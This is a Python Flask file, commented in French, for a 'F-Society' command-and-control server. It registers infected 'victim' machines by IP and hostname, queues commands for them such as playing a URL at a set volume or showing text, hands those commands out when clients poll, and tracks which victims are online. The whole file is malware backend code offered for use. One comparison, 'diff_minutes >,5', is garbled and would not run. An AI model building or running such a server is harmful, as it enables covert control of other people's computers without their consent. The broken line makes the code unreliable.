from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime, timezone
import time
import os

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# Stockage en mémoire
victims = {}
# Stockage des commandes
commands = {}

@app.route('/')
def home():
    return jsonify({"status": "online", "message": "F-Society Server Active"})

@app.route('/register', methods=['POST', 'GET'])
def register():
    if request.method == 'GET':
        return jsonify({"error": "Use POST method"}), 400
    
    try:
        data = request.get_json()
        
        if not data:
            ip = request.remote_addr
            hostname = request.headers.get('User-Agent', 'Unknown')
        else:
            ip = data.get('ip', request.remote_addr)
            hostname = data.get('hostname', 'Unknown PC')
        
        if ip == "127.0.0.1 (Local/Error)":
            ip = request.remote_addr
        
        victim_id = f"{ip}_{hostname}"
        
        victims[victim_id] = {
            'id': victim_id,
            'ip': ip,
            'hostname': hostname,
            'last_seen': datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"),
            'status': 'online',
            'last_heartbeat': datetime.now(timezone.utc).timestamp()
        }
        
        print(f"[+] Victim registered: {hostname} ({ip})")
        
        cleanup_old_victims()
        
        return jsonify({'status': 'ok', 'id': victim_id})
    
    except Exception as e:
        print(f"[-] Register error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/command', methods=['POST'])
def send_command():
    """Envoie une commande à une victime spécifique"""
    try:
        data = request.get_json()
        
        if not data or 'victim_id' not in data:
            return jsonify({'error': 'Missing victim_id'}), 400
        
        victim_id = data['victim_id']
        command_type = data.get('type', 'play')
        
        if victim_id not in victims:
            return jsonify({'error': 'Victim not found'}), 404
        
        # Stocker la commande
        commands[victim_id] = {
            'type': command_type,
            'url': data.get('url', ''),
            'volume': data.get('volume', 100),
            'text': data.get('text', ''),
            'timestamp': datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"),
            'executed': False
        }
        
        print(f"[+] Command sent to {victim_id}: {command_type}")
        
        return jsonify({
            'status': 'command_sent',
            'victim_id': victim_id,
            'command': commands[victim_id]
        })
    
    except Exception as e:
        print(f"[-] Command error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/command/<victim_id>/clear', methods=['POST'])
def clear_command(victim_id):
    """Supprime la commande pour une victime"""
    try:
        if victim_id in commands:
            del commands[victim_id]
            print(f"[+] Command cleared for {victim_id}")
            return jsonify({'status': 'command_cleared'})
        else:
            return jsonify({'status': 'no_command_found'})
    
    except Exception as e:
        print(f"[-] Clear command error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/check/<victim_id>', methods=['GET'])
def check_command(victim_id):
    """Endpoint pour que le client vérifie ses commandes"""
    try:
        # Mettre à jour le last_seen
        if victim_id in victims:
            victims[victim_id]['last_seen'] = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
            victims[victim_id]['last_heartbeat'] = datetime.now(timezone.utc).timestamp()
            victims[victim_id]['status'] = 'online'
        
        # Vérifier si une commande est en attente
        if victim_id in commands and not commands[victim_id]['executed']:
            command = commands[victim_id].copy()
            commands[victim_id]['executed'] = True  # Marquer comme exécutée
            
            print(f"[+] Command delivered to {victim_id}: {command['type']}")
            
            return jsonify({
                'status': 'command_pending',
                'command': command
            })
        
        return jsonify({'status': 'no_command'})
    
    except Exception as e:
        print(f"[-] Check command error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/victims', methods=['GET'])
def get_victims():
    try:
        now = datetime.now(timezone.utc)
        active_victims = []
        
        for vid, info in victims.items():
            last_seen_str = info['last_seen']
            
            if 'UTC' in last_seen_str:
                last_seen = datetime.strptime(last_seen_str, "%Y-%m-%d %H:%M:%S UTC").replace(tzinfo=timezone.utc)
            else:
                last_seen = datetime.strptime(last_seen_str, "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
            
            diff_minutes = (now - last_seen).total_seconds() / 60
            
            if diff_minutes >,5:
                info['status'] = 'offline'
            else:
                info['status'] = 'online'
            
            # Ajouter la commande en attente si elle existe
            if vid in commands:
                info['pending_command'] = commands[vid]['type']
            else:
                info['pending_command'] = None
            
            active_victims.append(info)
        
        return jsonify(active_victims)
    
    except Exception as e:
        print(f"[-] Get victims error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

def cleanup_old_victims():
    """Supprime les victimes de plus de 24h"""
    try:
        now = datetime.now(timezone.utc)
        to_delete = []
        
        for vid, info in victims.items():
            last_seen_str = info['last_seen']
            if 'UTC' in last_seen_str:
                last_seen = datetime.strptime(last_seen_str, "%Y-%m-%d %H:%M:%S UTC").replace(tzinfo=timezone.utc)
            else:
                last_seen = datetime.strptime(last_seen_str, "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
            
            diff_hours = (now - last_seen).total_seconds() / 3600
            
            if diff_hours > 24:
                to_delete.append(vid)
        
        for vid in to_delete:
            del victims[vid]
            if vid in commands:
                del commands[vid]
            print(f"[!] Removed old victim: {vid}")
    
    except Exception as e:
        print(f"[-] Cleanup error: {e}")

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "healthy",
        "victims_count": len(victims),
        "commands_pending": len([c for c in commands.values() if not c['executed']]),
        "timestamp": datetime.now(timezone.utc).isoformat()
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
